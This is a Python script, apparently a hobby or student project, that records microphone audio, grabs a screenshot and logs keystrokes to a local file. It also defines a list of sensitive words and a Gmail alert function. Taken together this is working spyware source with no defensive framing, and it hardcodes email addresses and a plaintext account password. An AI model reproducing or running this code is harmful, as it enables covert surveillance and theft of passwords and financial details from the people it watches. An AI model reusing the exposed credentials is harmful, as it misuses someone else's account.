#!/usr/bin/env python3

import sounddevice as sd
from scipy.io.wavfile import write
from pynput.keyboard import Key, Listener
import time
from PIL import ImageGrab
import smtplib
from email.mime.text import MIMEText

microphone_time = 10
audio_information = "data\\aduio.wav"
key_information = "data\\key_log.txt"
screenshot_information = "data\\screenshot.jpeg"
time_iteration = 15
number_of_iterations_end = 2



sensitive_words = {"password", "credit card", "ssn", "bank", "confidential"}




def send_alert_email(detected_word):
    sender_email = "cbitosc24@gmail.com"
    receiver_email = "nithinkonda142@gmail.com"
    password = "CBITopensource6942$"  # Use environment variables for security

    subject = "ALERT: Sensitive Word Detected"
    body = f"The word '{detected_word}' was detected in the key logs. Please check the logs for details."
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = sender_email
    msg["To"] = receiver_email

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
        print("Alert email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")




def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs,channels=2)
    sd.wait()
    write(audio_information, fs , myrecording)
microphone()



im = ImageGrab.grab()
im.save(screenshot_information)

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
while number_of_iterations<number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count=0
            write_file(keys)
            keys=[]

    def write_file(keys):
        with open(key_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space")>0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key ==  Key.esc:
            return False
        if currentTime>stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime>stoppingTime:
        with open(key_information, "a") as f:
            f.write(" ")
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


